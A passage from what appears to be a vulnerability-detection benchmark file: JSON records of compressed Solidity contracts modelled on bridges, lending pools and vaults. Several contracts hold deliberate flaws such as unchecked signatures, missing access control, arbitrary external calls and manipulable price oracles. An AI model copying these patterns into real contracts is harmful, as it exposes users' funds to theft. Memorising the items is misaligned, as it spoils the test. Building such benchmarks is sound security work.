      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 11,
        "mode": "compressed",
        "original_lines": 41,
        "transformed_lines": 30,
        "original_chars": 1149,
        "transformed_chars": 987,
        "compression_ratio": 0.86
      },
      "error": null
    },
    {
      "original_id": "sn_tc_026",
      "transformed_id": "ss_l1_compressed_sn_tc_026",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20Permit {\nfunction permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;\n}\ncontract BridgeRouter {\nfunction bridgeOutWithPermit(\naddress from,\naddress token,\naddress to,\nuint256 amount,\nuint256 deadline,\nuint8 v,\nbytes32 r,\nbytes32 s,\nuint256 toChainID\n) external {\nif (v != 0 || r != bytes32(0) || s != bytes32(0)) {\ntry IERC20Permit(token).permit(from, address(this), amount, deadline, v, r, s) {} catch {}\n}\n_bridgeOut(from, token, to, amount, toChainID);\n}\nfunction _bridgeOut(address from, address token, address to, uint256 amount, uint256 toChainID) internal {\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 9,
        "mode": "compressed",
        "original_lines": 33,
        "transformed_lines": 24,
        "original_chars": 864,
        "transformed_chars": 669,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_tc_027",
      "transformed_id": "ss_l1_compressed_sn_tc_027",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IPair {\nfunction token0() external view returns (address);\nfunction token1() external view returns (address);\nfunction getReserves() external view returns (uint112, uint112, uint32);\n}\ncontract SwapRouter {\nfunction swapExactTokensForTokens(\nuint256 amountIn,\nuint256 amountOutMin,\naddress[] calldata path,\naddress to,\nuint256 deadline\n) external returns (uint[] memory amounts) {\namounts = new uint[](path.length);\namounts[0] = amountIn;\nfor (uint i = 0; i < path.length - 1; i++) {\naddress pair = _getPair(path[i], path[i+1]);\n(uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();\namounts[i+1] = _getAmountOut(amounts[i], reserve0, reserve1);\n}\nreturn amounts;\n}\nfunction _getPair(address tokenA, address tokenB) internal pure returns (address) {\nreturn address(uint160(uint256(keccak256(abi.encodePacked(tokenA, tokenB)))));\n}\nfunction _getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {\nreturn (amountIn * uint256(reserveOut)) / uint256(reserveIn);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 12,
        "mode": "compressed",
        "original_lines": 42,
        "transformed_lines": 30,
        "original_chars": 1271,
        "transformed_chars": 1056,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_tc_028",
      "transformed_id": "ss_l1_compressed_sn_tc_028",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\ncontract TokenVault {\naddress public token;\nmapping(address => uint256) public deposits;\nconstructor(address _token) {\ntoken = _token;\n}\nfunction deposit(uint256 amount) external {\nIERC20(token).transferFrom(msg.sender, address(this), amount);\ndeposits[msg.sender] += amount;\n}\nfunction withdraw(uint256 amount) external {\nrequire(deposits[msg.sender] >= amount, \"Insufficient\");\ndeposits[msg.sender] -= amount;\nIERC20(token).transfer(msg.sender, amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 10,
        "mode": "compressed",
        "original_lines": 32,
        "transformed_lines": 22,
        "original_chars": 866,
        "transformed_chars": 733,
        "compression_ratio": 0.85
      },
      "error": null
    },
    {
      "original_id": "sn_tc_029",
      "transformed_id": "ss_l1_compressed_sn_tc_029",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\ninterface IPriceOracle {\nfunction getPrice(address token) external view returns (uint256);\n}\ncontract VaultStrategy {\naddress public wantToken;\naddress public oracle;\nuint256 public totalShares;\nmapping(address => uint256) public shares;\nconstructor(address _want, address _oracle) {\nwantToken = _want;\noracle = _oracle;\n}\nfunction deposit(uint256 amount) external returns (uint256 sharesAdded) {\nuint256 pool = IERC20(wantToken).balanceOf(address(this));\nif (totalShares == 0) {\nsharesAdded = amount;\n} else {\nuint256 price = IPriceOracle(oracle).getPrice(wantToken);\nsharesAdded = (amount * totalShares * 1e18) / (pool * price);\n}\nshares[msg.sender] += sharesAdded;\ntotalShares += sharesAdded;\nIERC20(wantToken).transferFrom(msg.sender, address(this), amount);\nreturn sharesAdded;\n}\nfunction withdraw(uint256 sharesAmount) external {\nuint256 pool = IERC20(wantToken).balanceOf(address(this));\nuint256 price = IPriceOracle(oracle).getPrice(wantToken);\nuint256 amount = (sharesAmount * pool * price) / (totalShares * 1e18);\nshares[msg.sender] -= sharesAmount;\ntotalShares -= sharesAmount;\nIERC20(wantToken).transfer(msg.sender, amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 55,
        "transformed_lines": 40,
        "original_chars": 1680,
        "transformed_chars": 1414,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_tc_030",
      "transformed_id": "ss_l1_compressed_sn_tc_030",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ncontract LiquidityPool {\nuint256 public baseAmount;\nuint256 public tokenAmount;\nuint256 public totalUnits;\nmapping(address => uint256) public units;\nfunction addLiquidity(uint256 inputBase, uint256 inputToken) external returns (uint256 liquidityUnits) {\nif (totalUnits == 0) {\nliquidityUnits = inputBase;\n} else {\nuint256 baseRatio = (inputBase * totalUnits) / baseAmount;\nuint256 tokenRatio = (inputToken * totalUnits) / tokenAmount;\nliquidityUnits = (baseRatio + tokenRatio) / 2;\n}\nunits[msg.sender] += liquidityUnits;\ntotalUnits += liquidityUnits;\nbaseAmount += inputBase;\ntokenAmount += inputToken;\nreturn liquidityUnits;\n}\nfunction removeLiquidity(uint256 liquidityUnits) external returns (uint256, uint256) {\nuint256 outputBase = (liquidityUnits * baseAmount) / totalUnits;\nuint256 outputToken = (liquidityUnits * tokenAmount) / totalUnits;\nunits[msg.sender] -= liquidityUnits;\ntotalUnits -= liquidityUnits;\nbaseAmount -= outputBase;\ntokenAmount -= outputToken;\nreturn (outputBase, outputToken);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 44,
        "transformed_lines": 30,
        "original_chars": 1274,
        "transformed_chars": 1029,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_tc_031",
      "transformed_id": "ss_l1_compressed_sn_tc_031",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract OrbitBridge {\nmapping(bytes32 => bool) public processedTransactions;\nuint256 public constant REQUIRED_SIGNATURES = 5;\nuint256 public constant TOTAL_VALIDATORS = 7;\nmapping(address => bool) public validators;\naddress[] public validatorList;\nevent WithdrawalProcessed(\nbytes32 txHash,\naddress token,\naddress recipient,\nuint256 amount\n);\nconstructor() {\nvalidatorList = new address[](TOTAL_VALIDATORS);\n}\nfunction withdraw(\naddress hubContract,\nstring memory fromChain,\nbytes memory fromAddr,\naddress toAddr,\naddress token,\nbytes32[] memory bytes32s,\nuint256[] memory uints,\nbytes memory data,\nuint8[] memory v,\nbytes32[] memory r,\nbytes32[] memory s\n) external {\nbytes32 txHash = bytes32s[1];\nrequire(\n!processedTransactions[txHash],\n\"Transaction already processed\"\n);\nrequire(v.length >= REQUIRED_SIGNATURES, \"Insufficient signatures\");\nrequire(\nv.length == r.length && r.length == s.length,\n\"Signature length mismatch\"\n);\nuint256 amount = uints[0];\nprocessedTransactions[txHash] = true;\nIERC20(token).transfer(toAddr, amount);\nemit WithdrawalProcessed(txHash, token, toAddr, amount);\n}\nfunction addValidator(address validator) external {\nvalidators[validator] = true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 68,
        "transformed_lines": 52,
        "original_chars": 1740,
        "transformed_chars": 1365,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_tc_032",
      "transformed_id": "ss_l1_compressed_sn_tc_032",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IFlashLoanReceiver {\nfunction executeOperation(\naddress[] calldata assets,\nuint256[] calldata amounts,\nuint256[] calldata premiums,\naddress initiator,\nbytes calldata params\n) external returns (bool);\n}\ncontract RadiantLendingPool {\nuint256 public constant RAY = 1e27;\nstruct ReserveData {\nuint256 liquidityIndex;\nuint256 totalLiquidity;\naddress rTokenAddress;\n}\nmapping(address => ReserveData) public reserves;\nfunction deposit(\naddress asset,\nuint256 amount,\naddress onBehalfOf,\nuint16 referralCode\n) external {\nIERC20(asset).transferFrom(msg.sender, address(this), amount);\nReserveData storage reserve = reserves[asset];\nuint256 currentLiquidityIndex = reserve.liquidityIndex;\nif (currentLiquidityIndex == 0) {\ncurrentLiquidityIndex = RAY;\n}\nreserve.liquidityIndex =\ncurrentLiquidityIndex +\n(amount * RAY) /\n(reserve.totalLiquidity + 1);\nreserve.totalLiquidity += amount;\nuint256 rTokenAmount = rayDiv(amount, reserve.liquidityIndex);\n_mintRToken(reserve.rTokenAddress, onBehalfOf, rTokenAmount);\n}\nfunction withdraw(\naddress asset,\nuint256 amount,\naddress to\n) external returns (uint256) {\nReserveData storage reserve = reserves[asset];\nuint256 rTokensToBurn = rayDiv(amount, reserve.liquidityIndex);\n_burnRToken(reserve.rTokenAddress, msg.sender, rTokensToBurn);\nreserve.totalLiquidity -= amount;\nIERC20(asset).transfer(to, amount);\nreturn amount;\n}\nfunction borrow(\naddress asset,\nuint256 amount,\nuint256 interestRateMode,\nuint16 referralCode,\naddress onBehalfOf\n) external {\nIERC20(asset).transfer(onBehalfOf, amount);\n}\nfunction flashLoan(\naddress receiverAddress,\naddress[] calldata assets,\nuint256[] calldata amounts,\nuint256[] calldata modes,\naddress onBehalfOf,\nbytes calldata params,\nuint16 referralCode\n) external {\nfor (uint256 i = 0; i < assets.length; i++) {\nIERC20(assets[i]).transfer(receiverAddress, amounts[i]);\n}\nrequire(\nIFlashLoanReceiver(receiverAddress).executeOperation(\nassets,\namounts,\nnew uint256[](assets.length),\nmsg.sender,\nparams\n),\n\"Flashloan callback failed\"\n);\nfor (uint256 i = 0; i < assets.length; i++) {\nIERC20(assets[i]).transferFrom(\nreceiverAddress,\naddress(this),\namounts[i]\n);\n}\n}\nfunction rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {\nuint256 halfB = b / 2;\nrequire(b != 0, \"Division by zero\");\nreturn (a * RAY + halfB) / b;\n}\nfunction _mintRToken(address rToken, address to, uint256 amount) internal {}\nfunction _burnRToken(\naddress rToken,\naddress from,\nuint256 amount\n) internal {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 138,
        "transformed_lines": 111,
        "original_chars": 3691,
        "transformed_chars": 2809,
        "compression_ratio": 0.76
      },
      "error": null
    },
    {
      "original_id": "sn_tc_033",
      "transformed_id": "ss_l1_compressed_sn_tc_033",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ncontract SocketGateway {\nmapping(uint32 => address) public routes;\nmapping(address => bool) public approvedRoutes;\nevent RouteExecuted(uint32 routeId, address user, bytes result);\nfunction executeRoute(\nuint32 routeId,\nbytes calldata routeData\n) external payable returns (bytes memory) {\naddress routeAddress = routes[routeId];\nrequire(routeAddress != address(0), \"Invalid route\");\nrequire(approvedRoutes[routeAddress], \"Route not approved\");\n(bool success, bytes memory result) = routeAddress.call(routeData);\nrequire(success, \"Route execution failed\");\nemit RouteExecuted(routeId, msg.sender, result);\nreturn result;\n}\nfunction addRoute(uint32 routeId, address routeAddress) external {\nroutes[routeId] = routeAddress;\napprovedRoutes[routeAddress] = true;\n}\n}\ncontract BasicRoute {\nfunction performAction(\naddress fromToken,\naddress toToken,\nuint256 amount,\naddress receiverAddress,\nbytes32 metadata,\nbytes calldata swapExtraData\n) external payable returns (uint256) {\nif (swapExtraData.length > 0) {\n(bool success, ) = fromToken.call(swapExtraData);\nrequire(success, \"Swap failed\");\n}\nreturn amount;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 62,
        "transformed_lines": 48,
        "original_chars": 1773,
        "transformed_chars": 1456,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_tc_034",
      "transformed_id": "ss_l1_compressed_sn_tc_034",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IUniswapV3Pool {\nfunction swap(\naddress recipient,\nbool zeroForOne,\nint256 amountSpecified,\nuint160 sqrtPriceLimitX96,\nbytes calldata data\n) external returns (int256 amount0, int256 amount1);\nfunction flash(\naddress recipient,\nuint256 amount0,\nuint256 amount1,\nbytes calldata data\n) external;\n}\ncontract GammaHypervisor {\nIERC20 public token0;\nIERC20 public token1;\nIUniswapV3Pool public pool;\nuint256 public totalSupply;\nmapping(address => uint256) public balanceOf;\nstruct Position {\nuint128 liquidity;\nint24 tickLower;\nint24 tickUpper;\n}\nPosition public basePosition;\nPosition public limitPosition;\nfunction deposit(\nuint256 deposit0,\nuint256 deposit1,\naddress to\n) external returns (uint256 shares) {\nuint256 total0 = token0.balanceOf(address(this));\nuint256 total1 = token1.balanceOf(address(this));\ntoken0.transferFrom(msg.sender, address(this), deposit0);\ntoken1.transferFrom(msg.sender, address(this), deposit1);\nif (totalSupply == 0) {\nshares = deposit0 + deposit1;\n} else {\nuint256 amount0Current = total0 + deposit0;\nuint256 amount1Current = total1 + deposit1;\nshares = (totalSupply * (deposit0 + deposit1)) / (total0 + total1);\n}\nbalanceOf[to] += shares;\ntotalSupply += shares;\n_addLiquidity(deposit0, deposit1);\n}\nfunction withdraw(\nuint256 shares,\naddress to\n) external returns (uint256 amount0, uint256 amount1) {\nrequire(balanceOf[msg.sender] >= shares, \"Insufficient balance\");\nuint256 total0 = token0.balanceOf(address(this));\nuint256 total1 = token1.balanceOf(address(this));\namount0 = (shares * total0) / totalSupply;\namount1 = (shares * total1) / totalSupply;\nbalanceOf[msg.sender] -= shares;\ntotalSupply -= shares;\ntoken0.transfer(to, amount0);\ntoken1.transfer(to, amount1);\n}\nfunction rebalance() external {\n_removeLiquidity(basePosition.liquidity);\n_addLiquidity(\ntoken0.balanceOf(address(this)),\ntoken1.balanceOf(address(this))\n);\n}\nfunction _addLiquidity(uint256 amount0, uint256 amount1) internal {}\nfunction _removeLiquidity(uint128 liquidity) internal {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 110,
        "transformed_lines": 83,
        "original_chars": 2924,
        "transformed_chars": 2346,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_035",
      "transformed_id": "ss_l1_compressed_sn_tc_035",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IERC721 {\nfunction transferFrom(address from, address to, uint256 tokenId) external;\nfunction ownerOf(uint256 tokenId) external view returns (address);\n}\ncontract WiseLending {\nstruct PoolData {\nuint256 pseudoTotalPool;\nuint256 totalDepositShares;\nuint256 totalBorrowShares;\nuint256 collateralFactor;\n}\nmapping(address => PoolData) public lendingPoolData;\nmapping(uint256 => mapping(address => uint256)) public userLendingShares;\nmapping(uint256 => mapping(address => uint256)) public userBorrowShares;\nIERC721 public positionNFTs;\nuint256 public nftIdCounter;\nfunction mintPosition() external returns (uint256) {\nuint256 nftId = ++nftIdCounter;\nreturn nftId;\n}\nfunction depositExactAmount(\nuint256 _nftId,\naddress _poolToken,\nuint256 _amount\n) external returns (uint256 shareAmount) {\nIERC20(_poolToken).transferFrom(msg.sender, address(this), _amount);\nPoolData storage pool = lendingPoolData[_poolToken];\nif (pool.totalDepositShares == 0) {\nshareAmount = _amount;\npool.totalDepositShares = _amount;\n} else {\nshareAmount =\n(_amount * pool.totalDepositShares) /\npool.pseudoTotalPool;\npool.totalDepositShares += shareAmount;\n}\npool.pseudoTotalPool += _amount;\nuserLendingShares[_nftId][_poolToken] += shareAmount;\nreturn shareAmount;\n}\nfunction withdrawExactShares(\nuint256 _nftId,\naddress _poolToken,\nuint256 _shares\n) external returns (uint256 withdrawAmount) {\nrequire(\nuserLendingShares[_nftId][_poolToken] >= _shares,\n\"Insufficient shares\"\n);\nPoolData storage pool = lendingPoolData[_poolToken];\nwithdrawAmount =\n(_shares * pool.pseudoTotalPool) /\npool.totalDepositShares;\nuserLendingShares[_nftId][_poolToken] -= _shares;\npool.totalDepositShares -= _shares;\npool.pseudoTotalPool -= withdrawAmount;\nIERC20(_poolToken).transfer(msg.sender, withdrawAmount);\nreturn withdrawAmount;\n}\nfunction withdrawExactAmount(\nuint256 _nftId,\naddress _poolToken,\nuint256 _withdrawAmount\n) external returns (uint256 shareBurned) {\nPoolData storage pool = lendingPoolData[_poolToken];\nshareBurned =\n(_withdrawAmount * pool.totalDepositShares) /\npool.pseudoTotalPool;\nrequire(\nuserLendingShares[_nftId][_poolToken] >= shareBurned,\n\"Insufficient shares\"\n);\nuserLendingShares[_nftId][_poolToken] -= shareBurned;\npool.totalDepositShares -= shareBurned;\npool.pseudoTotalPool -= _withdrawAmount;\nIERC20(_poolToken).transfer(msg.sender, _withdrawAmount);\nreturn shareBurned;\n}\nfunction getPositionLendingShares(\nuint256 _nftId,\naddress _poolToken\n) external view returns (uint256) {\nreturn userLendingShares[_nftId][_poolToken];\n}\nfunction getTotalPool(address _poolToken) external view returns (uint256) {\nreturn lendingPoolData[_poolToken].pseudoTotalPool;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 31,
        "mode": "compressed",
        "original_lines": 130,
        "transformed_lines": 99,
        "original_chars": 3745,
        "transformed_chars": 3003,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_036",
      "transformed_id": "ss_l1_compressed_sn_tc_036",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IBorrowerOperations {\nfunction setDelegateApproval(address _delegate, bool _isApproved) external;\nfunction openTrove(\naddress troveManager,\naddress account,\nuint256 _maxFeePercentage,\nuint256 _collateralAmount,\nuint256 _debtAmount,\naddress _upperHint,\naddress _lowerHint\n) external;\nfunction closeTrove(address troveManager, address account) external;\n}\ninterface ITroveManager {\nfunction getTroveCollAndDebt(\naddress _borrower\n) external view returns (uint256 coll, uint256 debt);\nfunction liquidate(address _borrower) external;\n}\ncontract MigrateTroveZap {\nIBorrowerOperations public borrowerOperations;\naddress public wstETH;\naddress public mkUSD;\nconstructor(address _borrowerOperations, address _wstETH, address _mkUSD) {\nborrowerOperations = _borrowerOperations;\nwstETH = _wstETH;\nmkUSD = _mkUSD;\n}\nfunction openTroveAndMigrate(\naddress troveManager,\naddress account,\nuint256 maxFeePercentage,\nuint256 collateralAmount,\nuint256 debtAmount,\naddress upperHint,\naddress lowerHint\n) external {\nIERC20(wstETH).transferFrom(\nmsg.sender,\naddress(this),\ncollateralAmount\n);\nIERC20(wstETH).approve(address(borrowerOperations), collateralAmount);\nborrowerOperations.openTrove(\ntroveManager,\naccount,\nmaxFeePercentage,\ncollateralAmount,\ndebtAmount,\nupperHint,\nlowerHint\n);\nIERC20(mkUSD).transfer(msg.sender, debtAmount);\n}\nfunction closeTroveFor(address troveManager, address account) external {\nborrowerOperations.closeTrove(troveManager, account);\n}\n}\ncontract BorrowerOperations {\nmapping(address => mapping(address => bool)) public delegates;\nITroveManager public troveManager;\nfunction setDelegateApproval(address _delegate, bool _isApproved) external {\ndelegates[msg.sender][_delegate] = _isApproved;\n}\nfunction openTrove(\naddress _troveManager,\naddress account,\nuint256 _maxFeePercentage,\nuint256 _collateralAmount,\nuint256 _debtAmount,\naddress _upperHint,\naddress _lowerHint\n) external {\nrequire(\nmsg.sender == account || delegates[account][msg.sender],\n\"Not authorized\"\n);\n}\nfunction closeTrove(address _troveManager, address account) external {\nrequire(\nmsg.sender == account || delegates[account][msg.sender],\n\"Not authorized\"\n);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 22,
        "mode": "compressed",
        "original_lines": 118,
        "transformed_lines": 96,
        "original_chars": 3165,
        "transformed_chars": 2500,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_tc_037",
      "transformed_id": "ss_l1_compressed_sn_tc_037",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IAaveOracle {\nfunction getAssetPrice(address asset) external view returns (uint256);\nfunction setAssetSources(\naddress[] calldata assets,\naddress[] calldata sources\n) external;\n}\ninterface ICurvePool {\nfunction exchange(\nint128 i,\nint128 j,\nuint256 dx,\nuint256 min_dy\n) external returns (uint256);\nfunction get_dy(\nint128 i,\nint128 j,\nuint256 dx\n) external view returns (uint256);\nfunction balances(uint256 i) external view returns (uint256);\n}\ninterface ILendingPool {\nfunction deposit(\naddress asset,\nuint256 amount,\naddress onBehalfOf,\nuint16 referralCode\n) external;\nfunction borrow(\naddress asset,\nuint256 amount,\nuint256 interestRateMode,\nuint16 referralCode,\naddress onBehalfOf\n) external;\nfunction withdraw(\naddress asset,\nuint256 amount,\naddress to\n) external returns (uint256);\n}\ncontract UwuLendingPool is ILendingPool {\nIAaveOracle public oracle;\nmapping(address => uint256) public deposits;\nmapping(address => uint256) public borrows;\nuint256 public constant LTV = 8500;\nuint256 public constant BASIS_POINTS = 10000;\nfunction deposit(\naddress asset,\nuint256 amount,\naddress onBehalfOf,\nuint16 referralCode\n) external override {\nIERC20(asset).transferFrom(msg.sender, address(this), amount);\ndeposits[onBehalfOf] += amount;\n}\nfunction borrow(\naddress asset,\nuint256 amount,\nuint256 interestRateMode,\nuint16 referralCode,\naddress onBehalfOf\n) external override {\nuint256 collateralPrice = oracle.getAssetPrice(msg.sender);\nuint256 borrowPrice = oracle.getAssetPrice(asset);\nuint256 collateralValue = (deposits[msg.sender] * collateralPrice) /\n1e18;\nuint256 maxBorrow = (collateralValue * LTV) / BASIS_POINTS;\nuint256 borrowValue = (amount * borrowPrice) / 1e18;\nrequire(borrowValue <= maxBorrow, \"Insufficient collateral\");\nborrows[msg.sender] += amount;\nIERC20(asset).transfer(onBehalfOf, amount);\n}\nfunction withdraw(\naddress asset,\nuint256 amount,\naddress to\n) external override returns (uint256) {\nrequire(deposits[msg.sender] >= amount, \"Insufficient balance\");\ndeposits[msg.sender] -= amount;\nIERC20(asset).transfer(to, amount);\nreturn amount;\n}\n}\ncontract CurveOracle {\nICurvePool public curvePool;\nconstructor(address _pool) {\ncurvePool = _pool;\n}\nfunction getAssetPrice(address asset) external view returns (uint256) {\nuint256 balance0 = curvePool.balances(0);\nuint256 balance1 = curvePool.balances(1);\nuint256 price = (balance1 * 1e18) / balance0;\nreturn price;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 134,
        "transformed_lines": 107,
        "original_chars": 3409,
        "transformed_chars": 2747,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_tc_038",
      "transformed_id": "ss_l1_compressed_sn_tc_038",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IPriceOracle {\nfunction getPrice(address token) external view returns (uint256);\n}\ncontract BlueberryLending {\nstruct Market {\nbool isListed;\nuint256 collateralFactor;\nmapping(address => uint256) accountCollateral;\nmapping(address => uint256) accountBorrows;\n}\nmapping(address => Market) public markets;\nIPriceOracle public oracle;\nuint256 public constant COLLATERAL_FACTOR = 75;\nuint256 public constant BASIS_POINTS = 100;\nfunction enterMarkets(\naddress[] calldata vTokens\n) external returns (uint256[] memory) {\nuint256[] memory results = new uint256[](vTokens.length);\nfor (uint256 i = 0; i < vTokens.length; i++) {\nmarkets[vTokens[i]].isListed = true;\nresults[i] = 0;\n}\nreturn results;\n}\nfunction mint(address token, uint256 amount) external returns (uint256) {\nIERC20(token).transferFrom(msg.sender, address(this), amount);\nuint256 price = oracle.getPrice(token);\nmarkets[token].accountCollateral[msg.sender] += amount;\nreturn 0;\n}\nfunction borrow(\naddress borrowToken,\nuint256 borrowAmount\n) external returns (uint256) {\nuint256 totalCollateralValue = 0;\nuint256 borrowPrice = oracle.getPrice(borrowToken);\nuint256 borrowValue = (borrowAmount * borrowPrice) / 1e18;\nuint256 maxBorrowValue = (totalCollateralValue * COLLATERAL_FACTOR) /\nBASIS_POINTS;\nrequire(borrowValue <= maxBorrowValue, \"Insufficient collateral\");\nmarkets[borrowToken].accountBorrows[msg.sender] += borrowAmount;\nIERC20(borrowToken).transfer(msg.sender, borrowAmount);\nreturn 0;\n}\nfunction liquidate(\naddress borrower,\naddress repayToken,\nuint256 repayAmount,\naddress collateralToken\n) external {}\n}\ncontract ManipulableOracle is IPriceOracle {\nmapping(address => uint256) public prices;\nfunction getPrice(address token) external view override returns (uint256) {\nreturn prices[token];\n}\nfunction setPrice(address token, uint256 price) external {\nprices[token] = price;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 95,
        "transformed_lines": 71,
        "original_chars": 2664,
        "transformed_chars": 2209,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_tc_039",
      "transformed_id": "ss_l1_compressed_sn_tc_039",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
